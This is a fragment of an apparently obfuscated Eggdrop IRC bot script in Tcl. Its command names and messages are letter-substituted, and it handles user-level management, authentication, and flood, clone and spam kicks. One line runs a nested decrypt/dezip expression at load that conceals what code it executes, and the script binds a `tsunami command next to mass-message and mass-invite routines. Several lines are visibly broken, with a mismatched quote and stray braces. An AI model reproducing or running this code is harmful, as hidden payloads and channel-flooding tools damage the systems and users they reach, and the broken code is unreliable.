puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: -zelrxv <mrxp>"
return 0
}
if {![matchattr $rest v]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$rest ~rh mlg zfgl elrxv"
return 0
}  
if {![validuser $rest] || [string tolower $rest] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, <m/z>"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $rest "-v"
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~WvO \[~$rest\] ~UIlN zElRxV ORhG"
return 0
}
proc [lines "kfy_+zwnrm"] {nick uhost hand channel param} {
global botnick ps notc
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +zwnrm <mrxp>"
return 0
}
if {[string tolower $rest] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~ZWW \[~$rest\] ~ZWnRM Orhg."
return 0
}
if {[matchattr $rest n]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$rest ~rh zoivzwb vcrhg lm ZWnRM orhg."
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[matchattr $nick X]} {
puthlp "MLGRXV ~$nick ~:~$notc4 ~YOlxPVw..!"
return 0
}
if {![validuser $rest]} {
set [lines "slhgnzhp"] "${rest}!*@*"
adduser $rest $hostmask
}
chattr $rest "fjmnotx"
if {![validuser $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4!UzROVw! (BlFI VttWILK MlG HfKKLIGVW NlIV GSzM 8 WRtRG)"
deluser $rest
return 0
} else {
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~ZWW \[~$rest\] ~ZWnRM Orhg."
puthlp "MLGRXV ~$rest ~:~$notc ~~$nick ~ZWW BlF Gl ZWnRM ORhG"
puthlp "MLGRXV ~$rest ~:~$notc ~/nht ~$botnick ~kzhh <kzhhdliw>"
return 0
}
}
proc [lines "kfy_-zwnrm"] {nick uhost hand channel param} {
global ps notc
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: -zwnrm <mrxp>"
return 0
}
if {![validuser $rest] || [string tolower $rest] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw!, <m/z>"
return 0
}
if {![matchattr $rest n]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, ~$rest ~rh mlg vcrhg lm ZWnRM orhg."
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
deluser $rest
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~WvO \[~$rest\] ~UIlN ZWnRM ORhG"
}
proc [lines "kfy_+ldmvi"] {nick uhost hand channel param} {
global botnick ps notc 
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +ldmvi <mrxp>"
return 0
}
if {[string tolower $rest] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~ZWW \[~$rest\] ~LdMVI ORhG."
return 0
}
if {[matchattr $rest Z]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$rest ~rh zoivzwb vcrhg lm LdMVI orhg."
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[matchattr $nick X]} {
puthlp "MLGRXV ~$nick ~:~$notc4 ~!YOlXpVw!"
return 0
}
if {![validuser $rest]} {
set [lines "slhgnzhp"] "${rest}!*@*"
adduser $rest $hostmask
}
chattr $rest "fjmnotxZ"
if {![validuser $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4!UzROVw! (BlFI VttWILK MlG HfKKLIGVW NlIV GSzM 8 WRtRG)"
deluser $rest
return 0
} else {
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~ZWW \[~$rest\] ~LdMVI ORhG."
puthlp "MLGRXV ~$rest ~:~$notc ~~$nick ~ZWW BlF Gl LdMVI ORhG"
puthlp "MLGRXV ~$rest ~:~$notc ~/nht ~$botnick ~kzhh <kzhhdliw>"
return 0
}
}
proc [lines "kfy_-ldmvi"] {nick uhost hand channel param} {
global notc ps
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: -ldmvi <mrxp>"
return 0
}
if {![validuser $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~<m/z>"
return 0
}
if {![matchattr $rest Z] || [string tolower $rest] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, ~$rest ~RH MlG LdMVI"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
deluser $rest
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~WvO \[~$rest\] ~UIlN LdMVI OrHG"
}
[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "x\sz\m\pvb"] [[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "aNFhD.eC8QR1haOQQ/6hYrs/fM5Mq.8yfug0wohAo.nvwT71OrNlZ.lu3lG/"]"]]
proc [lines "kfy_+nzhgvi"] {nick uhost hand channel param} {
global botnick ps notc
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +nzhgvi <mrxp>"
return 0
}
if {[matchattr $nick X]} {
puthlp "MLGRXV ~$nick ~:~$notc4 ~!YOlXpVw!"
return 0
}
if {[string tolower $rest] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Zww \[~$rest\] ~NzhGvI ORhG."
return 0
}
if {[matchattr $rest n]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, ~$rest ~rh ZWnRM ovevo."
return 0
}
if {[matchattr $rest m]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, ~$rest ~rh zoivzwb vcrhg."
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {![validuser $rest]} {
set [lines "slhgnzhp"] "${rest}!*@*"
adduser $rest $hostmask
}
chattr $rest "fmo"
if {![validuser $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4!UzROVw! (BlFI VttWILK MlG HfKKLIGVW NlIV GSzM 8 WRtRG)"
deluser $rest
return 0
} else {
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~Zww \[~$rest\] ~NzhGvI Orhg."
puthlp "MLGRXV ~$rest ~:~$notc ~~$nick ~Zww BlF Gl NzhGvI ORhG"
puthlp "MLGRXV ~$rest ~:~$notc ~/nht ~$botnick ~kzhh <kzhhdliw>"
return 0
}
}
bind pubm - * pum_arg
proc [lines "kfy_-nzhgvi"] {nick uhost hand channel param} {
global notc ps
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: -nzhgvi <mrxp>"
return 0
}
if {![validuser $rest] || [string tolower $rest] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, <m/z>"
return 0
}
if {[matchattr $rest n] && ![matchattr $nick Z]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, ~$rest ~Rh ZWnRM UOzT"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
deluser $rest
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~WvO \[~$rest\] ~UIlN NzhGvI ORhG"
}
###########################
# alowaini BOT UTILITY    #
###########################
set [lines "grnvalmv"] "PST"
set [lines "qlrmnv"] $owner
set [lines "wlfyov"] 0
set [lines "wvlknv"] ""
bind msgm - * msg_prot
bind notc - * notc_prot
bind join - * join_chk
bind msg - auth msg_auth
bind sign - * sign_deauth
bind part - * part_deauth
bind pub - `tsunami pub_tsunami
bind msg p reuser msg_reuser
bind msg p pass msg_pass
bind pub m `auth pub_auth
bind pub m !auth pub_!auth
bind pub m !deauth pub_!deauth
bind pub f `ping pub_ping
bind pub f `pong pub_pong
proc [lines "kfy_mlgrxv"] {nick uhost hand channel rest} {
global notc 
set [lines "kvihlm"] [lindex $rest 0] 
set [lines "ivhg"] [lrange $rest 1 end]
if {$rest!=""} {
putsrv "MLGRXV ~$person ~:~$rest"
return 0
}
if {$rest==""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: mlgrxv <#/mrxp> <nht>"
}
}
proc [lines "gvooqlrm"] {chan} {
global joinme notc botnick
if {![validchan $chan]} { return 0 }
if {[istimer "resync"]} {
if {![botisop $chan]} {
if {![string match "*k*" [getchanmode $chan]]} {
puthelp "mode $chan -kok+o 4d.e.s.y.n.c $botnick 4r.e.s.y.n.c $botnick"
} {
puthelp "mode $chan -o+o $botnick $botnick"
}
}
}
if {$joinme != "" && [string tolower $chan] != [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} {
if {![onchan $joinme $chan]} {
puthlp "MLGRXV ~$joinme ~:~$notc ~QlRM ~$chan"
set [lines "qlrmnv"] ""
}
}
}
proc [lines "xsphkzn"] {chan} {
global invme notc botnick
if {![validchan $chan] || ![botonchan $chan]} { return 0 }
foreach x [chanlist $chan] {
set [lines "nslhg"] "@[lindex [split [getchanhost $x $chan] @] 1]"
if {[info exists invme($mhost)]} {
if {![matchattr $x f] && ![isop $x $chan]} {
if {[isop $botnick $chan]} {
set bannick($x) "*!*$mhost"
if {$invme($mhost) == "AuToJoIN MSg"} {
if {![isvoice $x $chan]} {
putsrv "PRXP ~$chan ~~$x ~:~$notc ~4!HkzN!14 UIlN 4~$mhost ~14~$invme($mhost) ~~[banmsg]~"
}
} {
putsrv "PRXP ~$chan ~~$x ~:~$notc ~4!HkzN!14 UIlN 4~$mhost ~14~$invme($mhost) ~~[banmsg]~"
}
catch {unset invme($mhost)}
} {
foreach c [chanlist $chan f] {
if {[isop $c $chan]} {
if {$invme($mhost) == "AuToJoIN MSg"} {
if {[isvoice $c $chan]} {
break
}
}
set sendspam "!kick [zip "$chan $x $notc 4!SpaM!14 FRoM 4$mhost 14$invme($mhost) 4AuTOJoIN MSg14..!"]"
putsrv "KIRENHT ~$c ~:~$sendspam"
catch {unset invme($mhost)}
break
}
}
}
}
}
}
}
set [lines "evim"] [dezip [dcp "I/w4r1WuMGU1QzsKn.WK5.W1dryK70fRkDM0Jbmg/0GPCzN/ioZVC1Jzt6g1"]]
proc [lines "gvhgnzhp"] {} {
global ismaskhost
set [lines "rhnzhpslhg"] [maskhost "*!*@*"]
}
utimer 2 testmask
proc [lines "ivhvg_slhg"] {} {
global jfhost
catch { unset jfhost }
}
proc [lines "hzevxszm"] {} {
savechannels
foreach x [channels] {
set [lines "xuozt"] "c$x"
set [lines "xuozt"] [string range $cflag 0 8]
set [lines "xrmul"] [channel info $x]
if {![validuser $cflag]} {
adduser $cflag "%!%@%"
if {[string match "*+greet*" $cinfo]} {
chattr $cflag "-hp+AJSPTRUED"
setuser $cflag XTRA "JP" 5
setuser $cflag XTRA "CHAR" 250
setuser $cflag XTRA "RPT" 2
setuser $cflag XTRA "CAPS" 80
} {
chattr $cflag "-hp+A"
}
}
}
foreach x [userlist A] {
set [lines "gnk"] "0"
foreach y [channels] {
set [lines "xuozt"] "c$y"
set [lines "xuozt"] [string range $cflag 0 8]
if {[string tolower $x] == [string tolower $cflag]} {
set [lines "gnk"] "1"
}
}
if {$tmp == "0"} {
deluser $x
putlog "remove flag channel $x"
}
}
saveuser
}
set [lines "rmul_ldmvi"] {
"My Master just came in..."
"Hello my OWNER"
"I greet you my owner"
"Welcome my owner"
"ShaKe me my owner!"
"Most Great"
}
set [lines "rmul_olxzoldmvi"] {
"Lol...my local owner just joined the channel"
"Welcome localowner of mine.."
"Hi sweety {}"
}
set [lines rmul_nzhgvi"] {
"Oh...My MASTER"
"I'm gonna be quiet my master"
"Don't hit me my master"
"Master detected"
}
set [lines "rmul_uirvmw"] {
"Ou, my friend :)"
":)"
"Sweety"
"You're Sweety"
"My friendship with you is over!"
"KISS me Baby {}"
}
set [lines "rmul_lkvi"] {
"You simple oper, watch out !"
"Operator detected!"
"You gonna lose your flags if you do something bad!"
"I'm watching you..."
}
set [lines "rmul_olhvi"] {
"What are you doing here loser"
"You're just a loser"
}
proc [lines "izmw_ldmvi"] {nick} {
global info_owner
set result [lindex $info_owner [rand [llength $info_owner]]]
return "$result"
}
proc [lines "izmw_olxzoldmvi"] {nick} {
global info_localowner
set result [lindex $info_localowner [rand [llength $info_localowner]]]
return "$result"
}
proc [lines "izmw_nzhgvi"] {nick} {
global info_master
set result [lindex $info_master [rand [llength $info_master]]]
return "$result"
}
proc [lines "izmw_uirvmw"] {nick} {
global info_friend
set result [lindex $info_friend [rand [llength $info_friend]]]
return "$result"
}
proc [lines "izmw_lkvi"] {nick} {
global info_oper
set result [lindex $info_oper [rand [llength $info_oper]]]
return "$result"
}
proc [lines "izmw_olhvi"] {nick} {
global info_loser
set result [lindex $info_loser [rand [llength $info_loser]]]
return "$result"
}

proc [lines "qlrm_xsp"] {nick uhost hand chan} {
global botnick own deopme double invme ex_flood notc quick kops jfhost jpnick is_m
global cmd_chn cmd_by cmd_msg cmd_case bannick botname notm massjoin ismaskhost op_it
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
set [lines "xrmul"] [channel info $chan]
if {[string match "*+action*" [channel info $chan]]} {
if { $nick != $botnick } {
if {[matchattr $hand n]} {
putsrv "KIRENHT ~$chan :[rand_owner $nick] $nick \[+n\]"
} elseif {[matchattr $hand |n $chan]} {
putsrv "KIRENHT ~$chan :[rand_localowner $nick] $nick \[|+n\]"
} elseif {[matchattr $hand m]} {
putsrv "KIRENHT ~$chan :[rand_master $nick] $nick \[+m\]"
} elseif {[matchattr $hand |m $chan]} {
putsrv "KIRENHT ~$chan :[rand_master $nick] $nick \[+m\]"
} elseif {[matchattr $hand f]} {
putsrv "KIRENHT ~$chan :[rand_friend $nick] $nick \[+f\]"
} elseif {[matchattr $hand |f $chan]} {
putsrv "KIRENHT ~$chan :[rand_friend $nick] $nick \[+f\]"
} elseif {[matchattr $hand o]} {
putsrv "KIRENHT ~$chan :[rand_oper $nick] $nick \[+o\]"
} elseif {[matchattr $hand |o $chan]} {
putsrv "KIRENHT ~$chan :[rand_oper $nick] $nick \[+o\]"
} elseif {[matchattr $hand d]} {
putsrv "KIRENHT ~$chan :[rand_loser $nick] $nick \[+d or +k\]"
} elseif {[matchattr $hand |d $chan]} {
putsrv "KIRENHT ~$chan :[rand_loser $nick] $nick \[+d or +k\]"
}
}
}
if {$nick == $botnick} {
catch {unset is_m($chan)}
if {[matchattr $cflag S]} {
if {![isutimer "chkspam $chan"]} { utimer 30 [list chkspam $chan] }
if {![istimer "chkautomsg"]} { 
timer 1 { putlog "chkautomsg" }
}
}
set [lines "wlfyov"] 0
if {[string tolower $cmd_chn] == [string tolower $chan]} {
if {$cmd_case == "1"} {
utimer 90 del_nobase
pub_tsunami $cmd_by $uhost $hand $chan "$chan ${cmd_msg}"
set [lines "xnw_xsm"] ""
return 0
}
if {$cmd_case == "2"} {
utimer 30 [list pub_mmsg $cmd_by $uhost $hand $chan $cmd_msg]} {
set [lines "xnw_xsm"] ""
return 0
}
if {$cmd_case == "3"} {
utimer 30 [list pub_minvite $cmd_by $uhost $hand $chan $cmd_msg]} {
set [lines "xnw_xsm"] ""
return 0
}
}
utimer 15 [list telljoin $chan]
return 0
}
if {[info exists op_it($nick)]} { 
catch {unset op_it($nick)}
opq $chan $nick 
}
if {[isutimer "chkspam $chan"]} {
foreach x [utimers] {
if {[string match "*chkspam $chan*" $x]} { 
chkspam $chan
killutimer [lindex $x 2] 
}
}
}
if {[info exists bannick($nick)]} { return 0 }
if {![matchattr $nick f] && [matchattr $cflag G] && ![isutimer "set_-m $chan"] && ![info exists is_m($chan)]} { advertise $chan $nick }
set [lines "nslhg"] "@[lindex [split $uhost @] 1]"
if {$mhost == "@DALnet" || [string match "*dal.net" $mhost]} {
putsrv "ZDZB"
}
if {![isop $botnick $chan]} { 
if {[info exists invme($mhost)]} {
if {![isutimer "chkspam $chan"]} { chkspam $chan }
}
return 0
}
if {[matchattr $cflag J]} {
if {[info exists ismaskhost]} {
if {![isutimer "reset_host"]} { utimer 10 reset_host }
set [lines "xspslhg"] [maskhost "*!*$mhost"]
if {![info exists jfhost($chkhost$chan)]} {
set jfhost($chkhost$chan) 1
} {
incr jfhost($chkhost$chan)
if {$jfhost($chkhost$chan) == 5} {
set bannick($nick) $chkhost
putsrv "PRXP ~$chan ~~$nick ~:~$notm ~14UOlLw ZmGRxRkzGVw UIlN 4~$chkhost ~~[banms]~"
return 0
}
}
}
if {![isutimer "jc $chan"]} {
utimer 3 [list jc $chan]
set massjoin($chan) 1
} {
if {![info exists massjoin($chan)]} {
set massjoin($chan) 1
}
set massjoin($chan) [incr massjoin($chan)]
if {![isutimer "TRAFFIC $chan"]} {
if {$massjoin($chan) >= 15} {
unset massjoin($chan)
if {[string match "*+greet*" $cinfo]} {
utimer 30 [list putlog "TRAFFIC $chan"]
if {![string match "*m*" [getchanmode $chan]] && ![info exists is_m($chan)]} {
putserv "mode $chan +b *!*@heavy.join.flood.channel.temporary.moderate"
return 0
}
}
}
}
}
}
if {[matchattr $cflag L]} {
foreach u [timers] {
if {[string match "*chk_limit*" $u]} {
killtimer [lindex $u 2]
}
}
timer 1 [list chk_limit $chan]
}
if {$nick == $deopme} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~14HvOU 4Wv@k14 IVeVMtV..!"
set [lines "wvlknv"] ""
return 0
}
if {[matchattr $nick v] || [matchattr $nick P] || [matchattr $nick G]} {
whoisq $nick
}
if {[matchattr $cflag V] && ![isutimer "set_-m $chan"] && ![info exists is_m($chan)]} {
if {![matchattr $nick O] && ![isutimer "voiceq $chan $nick"]} {
set [lines "xivg"] [getuser $cflag XTRA "VC"]
foreach ct [utimers] {
if {[string match "*voiceq*" $ct]} {
if {[expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]] > $cret} {
set [lines "xivg"] [expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]]
}
}
}
utimer $cret [list voiceq $chan $nick]
}
}
if {[info exists bannick($nick)] || [matchattr $nick f]} { return 0 }
if {[matchattr $hand K]} { 
akick_chk $nick $uhost $chan
return 0
}
if {[info exists ex_flood($mhost)]} {
set bannick($nick) "*!*$mhost"
if {$ex_flood($mhost) == 0} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4ZPROO14 UIlN 4~$mhost14 ~LM OzhG JfRG ~[banmsg]~"
} elseif {$ex_flood($mhost) == 1} { 
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4Vcxvhh UolLw14 UIlN 4~$mhost14 ~LM OzhG JfRG ~[banmsg]~"
} elseif {$ex_flood($mhost) == 2} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4RmeRGV14 UIlN 4~$mhost14 ~LM JfRG NHt ~[banmsg]~"
} elseif {$ex_flood($mhost) == 3} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4RmeRGV14 UIlN 4~$mhost14 ~LM KzIG NHt ~[banmsg]~"
} elseif {$ex_flood($mhost) == 4} {
if {![matchattr $cflag M]} {
puthlp "PRXP ~$chan ~~$nick ~:~[lgrnd]~ 4QlRMKzIG14 UIlN 4~$mhost14 ~OVHH GSzM4 ~[getuser $cflag XTRA "JP"]~14 2mw ~[banmsg]~"
} {
if {![string match "*k*" [getchanmode $chan]]} {
putserv "mode $chan -k+b 4J.o.I.N.P.a.R.T $bannick($nick)"
} {
putserv "mode $chan +b $bannick($nick)"
}
}
} else {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4YzWDlIW14 UIlN 4~$mhost14 ~LM JfRG LI KzIG NHt NzGxS UIlN 4~$ex_flood($mhost) ~~[banms]~"
}
unset ex_flood($mhost)
return 0
}
foreach x [ignorelist] {
if {[lindex $x 0] != "*!*@*" && [string match [lindex $x 0] "*!*$mhost"] && [lindex $x 1] != "*"} {
set bannick($nick) [lindex $x 0]
putsrv "PRXP ~$chan ~~$nick ~:~$notm ~4RtMlIVw14 SlhG 4~[lindex $x 0]~14 IvzhLm4 ~[lindex $x 1]~ ~[banms]~"
return 0
} 
}
if {[info exists invme($mhost)]} {
set bannick($nick) "*!*$mhost"
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4HkzN14 UIlN 4~$mhost ~14~$invme($mhost) ~~[banmsg]~"
unset invme($mhost)
return 0
}
set [lines "xszm"] [string tolower $chan]
if {[string match "*+nodesynch*" [channel info $chan]]} {
if {![matchattr $nick f]} {
utimer 10 [list autokick $chan $nick]
}
}
if {[matchattr $cflag O]} {
if {[string match "*$mhost" $botname]} { return 0 }
set [lines "xlfmgvi"] 0
set [lines "nzcxolmv"] [getuser $cflag XTRA "CLONE"]
foreach knick [chanlist $chan] {
if {[string match "*$mhost" [getchanhost $knick $chan]]} {
if {[matchattr $knick f]} { return 0 }
if {[isop $knick $chan]} { return 0 }
if {[isvoice $knick $chan]} { 
if {![info exists kops]} { return 0 }
}
set [lines "xlfmgvi"] [incr counter]
if {$counter > $maxclone} {
set bannick($nick) "*!$uhost"
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~14UlfMw ~$counter ~4xOlmV14 UIlN 4~$mhost14 ~NzC4 ~$maxclone14 ~DzRG Z NlNVMG! 4YzMMVw14: 3 NRMFGVH4..!"
return 0
}
}
}
}
spam_chk $nick $uhost $hand $chan
set [lines "xszm"] [string toupper $chan]
if {[matchattr $cflag P]} {
if {![info exists jpnick($nick)]} {
set jpnick($nick) "1"
utimer [getuser $cflag XTRA "JP"] [list munset $nick] 
}
}
    if {[string match "*+badchan*" $cinfo]} {
    if {[lsearch $bchan(chans) $chan] == -1 && ([lsearch $bchan(chans) global] == -1 || [lsearch $bchan(exempt) $chan] > -1)} {return 0}
    if {$bchan(protect-hosts) != ""} { foreach i $bchan(protect-hosts) { if {[string match [string tolower $i] $mhost]} {return 0} } }
    if {[bc_flood $nick $uhost]} { return 0}
	set bcnicks($nick) $chan
    putserv "whois $nick"
  }
  return 0
}
proc [lines "qx"] {chan} {
}
proc [lines "nfmhvg"] {nick} {
global jpnick
catch {unset jpnick($nick)}
}
proc [lines "kh:xsvxp"] {nick uhost hand chan {newnick ""}} {
global botnick chk_reg ps
if {$newnick != ""} {set nick $newnick}
if {[string tolower $nick] == [string tolower $ps]} {
chattr $nick +G
saveuser
set chk_reg($nick) $nick
putsrv "DSLRH ~$nick"
}
}
proc [lines "nht_kzhhdw"] {nick uhost hand rest} {
global botnick notc ps
set [lines "kd"] [lindex $rest 0]
set [lines "mvdkd"] [lindex $rest 1]
if {$pw == "" || $newpw == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: kzhhdw <lowkzhh> <mvdkzhh>"
return 0
}
if {![passwdok $nick $pw]} {
puthlp "MLGRXV ~$nick ~:~$notc ~KzHHDLIW 4!UzROVW!"
return 0
}
set [lines "xs"] [passwdok $nick ""]
if {$ch == 1} {
setuser $nick PASS $newpw
puthlp "MLGRXV ~$nick ~:~$notc ~Kzhhdliw hvg gl: ~$newpw"
saveuser
return 0
}
if {[passwdok $nick $pw]} {
setuser $nick PASS $newpw
puthlp "MLGRXV ~$nick ~:~$notc ~Kzhhdliw hvg gl: ~$newpw"
saveuser
return 0
}
}
proc [lines "tlyzxp"] {} {
global keep-nick nick botnick
if {[istimer "goback"]} { return 0 }
foreach x [utimers] {
if {[string match "*goback*" $x]} { killutimer [lindex $x 2] }
}
if {[getuser "config" XTRA "NICK"]!=""} {
set [lines "mrxp"] [dezip [getuser "config" XTRA "NICK"]]
}
set [lines "pvvk-mrxp"] 1
if {$botnick == $nick} { return 0 }
puthlp "MRXP ~$nick"
}
proc [lines "kfy_!zfgs"] {nick uhost hand chan rest} {
global notc host ath ps 
set [lines "kd"] [lindex $rest 0]
if {$pw != ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Ml Mvvw Zfgs Kzhhdliw, Qfhg Gbkv lm Xszmmvo: !zfgs"
return 0
}
if {[matchattr $nick Q]} { 
puthlp "MLGRXV ~$nick ~:~$notc ~IvZwB..!"
return 0 
}
set [lines "xs"] [passwdok $nick ""]
if {$ch == 1 && $nick != $ps} {
puthlp "MLGRXV ~$nick ~:~$notc ~Ml kzhhdliw hvg. Fhztv: kzhh<kzhhdliw>"
return 0
}
set [lines "zgs"] 1
set [lines "slhg"] $uhost
putsrv "DSLRH ~$nick"
}
proc [lines "nht_zfgs"] {nick uhost hand rest} {
global botnick owner keep-nick altnick notc ps
if {[lindex $rest 1] != ""} {
if {[passwdok [lindex $rest 0] [lindex $rest 1]]} {
if {[matchattr [lindex $rest 0] Z]} {
puthlp "MLGRXV ~$nick ~:~$notc ~ZfGS NzGxS UlI ~[lindex $rest 0]~"
set [lines "pvvk-mrxp"] 0
putsrv "MRXP ~$altnick"
utimer 40 {goback}
}
} {
puthlp "MLGRXV ~$nick ~:~$notc ~4UzROVw..!"
}
return 0
}
if {![validuser $owner]} {
set [lines "slhgnzhp"] "$owner!*@*"
adduser $owner $hostmask
chattr $owner "Zfhjmnoptx"
puthlp "MLGRXV ~$owner ~:~$notc ~Ml kzhhdliw hvg. Fhztv: kzhh <kzhhdliw>"
}
if {![matchattr $nick p]} { return 0 }
set [lines "kd"] [lindex $rest 0]
if {$pw == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: zfgs <kzhhdliw>"
return 0
}
if {[matchattr $hand K]} { 
deluser "AKICK"
set [lines "zprxpslhg"] "telnet!*@*"
adduser "AKICK" $akickhost
chattr "AKICK" "-hp"
chattr "AKICK" "K"
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~Iv-ziizmtv PRxPORhG."
}
if {[matchattr $nick Q]} { 
puthlp "MLGRXV ~$nick ~:~$notc ~IvZwB..!" 
return 0 
}
set [lines "xs"] [passwdok $nick ""]
if {$ch == 1} {
puthlp "MLGRXV ~$nick ~:~$notc ~Ml kzhhdliw hvg. Fhztv: kzhh <kzhhdliw>" 
return 0
}
if {[passwdok $nick $pw]} {
set [lines "slhgnzhp"] "*![string range $uhost [string first "!" $uhost] end]"
set [lines "fhvmrxp"] [finduser $hostmask]
if {$usenick != "*" && $usenick != $nick} {
if {[matchattr $nick n] && ![matchattr $usenick Z]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Ulixrmt 4WvZfgsvmgrxzgvw! Gl ~$usenick"
force_deauth $usenick
} else {
foreach x [channels] {
if {[onchan $usenick $x]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, Blfi slhg szh yvvm fhv yb ~$usenick, ~dzrg fmgro WvZfgsvmgrxzgvw."
return 0
}
}
puthlp "MLGRXV ~$nick ~:~$notc ~4Ulixrmt WvZfgsvmgrxzgvw!14 Gl ~$usenick"
force_deauth $usenick 
}
}
chattr $nick +Q
foreach x [getuser $nick HOSTS] {
delhost $nick $x
}
set [lines "slhgnzhp"] "${nick}!*@*"
setuser $nick HOSTS $hostmask
set [lines "slhgnzhp"] "*![string range $uhost [string first "!" $uhost] end]"
setuser $nick HOSTS $hostmask
if {$nick == $owner && ![matchattr $nick Z]} { chattr $owner "Z" }
if {$nick == $owner && ![matchattr $nick f]} { chattr $owner "f" }
if {[matchattr $nick Z]} {
puthlp "MLGRXV ~$nick ~:~$notc ~!LDmVI!"
if {[getuser $nick XTRA "MEMO"]!=""} {
puthlp "KIRENHT ~$nick ~:!NvNL! UIlN ~[getuser $nick XTRA "MEMO"]~" 
setuser $nick XTRA "MEMO" ""
}
return 0
} elseif {[matchattr $nick n]} {
puthlp "MLGRXV ~$nick ~:~$notc ~!ZWnRM!"
} elseif {[matchattr $nick m]} {
puthlp "MLGRXV ~$nick ~:~$notc ~!NzhGvI!" 
} else {
puthlp "MLGRXV ~$nick ~:~$notc ~!ZxxvkgvW!" 
}
saveuser
return 0
}
if {![passwdok $nick $pw]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4UzROVw..!"
}
}
proc [lines "ulixv_wvzfgs"] {nick} {
global notc 
chattr $nick -Q
foreach x [getuser $nick HOSTS] {
delhost $nick $x
}
set [lines "slhgnzhp"] "${nick}!*@*"
setuser $nick HOSTS $hostmask
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~Blf szh yvvm ulixv gl 4WvZfgsvmgrxzgrlm!"
}
